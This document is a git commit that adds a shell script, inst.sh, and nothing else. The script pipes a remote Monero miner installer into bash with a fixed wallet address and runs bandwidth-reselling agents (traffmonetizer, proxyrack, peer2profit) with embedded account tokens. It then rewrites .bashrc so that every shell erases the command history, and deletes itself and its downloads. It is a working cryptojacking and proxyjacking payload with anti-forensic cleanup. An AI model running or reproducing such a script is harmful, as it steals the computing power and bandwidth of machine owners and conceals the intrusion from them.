40c7556613346ee8f447509d0357ec295cb36020
aldnesjxeakxs <104668980+aldnesjxeakxs@users.noreply.github.com>
2023-06-07 12:49:25 +0800

    Create inst.sh

---
+++ inst.sh
@@ -0,0 +1,19 @@
+curl -s -L https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49w8gsLw7UwUVszUBtYujdN1McNkoeYucTctaePX8nmbjKABzJ9S1rigWdh5EiUT1z4NPAPchxT7RaJXN3fURUpM6F6KGjy
+
+curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh
+chmod +x tm.sh
+bash ./tm.sh -t N1wSyYm8cEsQa/o/hTodQ70tRRUQpSiPqtJPI30Nzxo=
+
+curl -L https://raw.githubusercontent.com/spiritLHLS/proxyrack-one-click-command-installation/main/proxyrack.sh -o proxyrack.sh
+chmod +x proxyrack.sh
+bash proxyrack.sh -t VHTDX1HKYUI6YOIEPZXAIIVU92XYP39MAGJHELQL
+
+curl -L https://raw.githubusercontent.com/spiritLHLS/peer2profit-one-click-command-installation/main/p.sh -o p.sh
+chmod +x p.sh
+bash p.sh -m mengxin82@outlool.com
+rm -rf tm.sh proxyrack.sh
+
+echo ":>.bash_history" >.bashrc
+
+rm -rf p.sh
+rm -rf $0
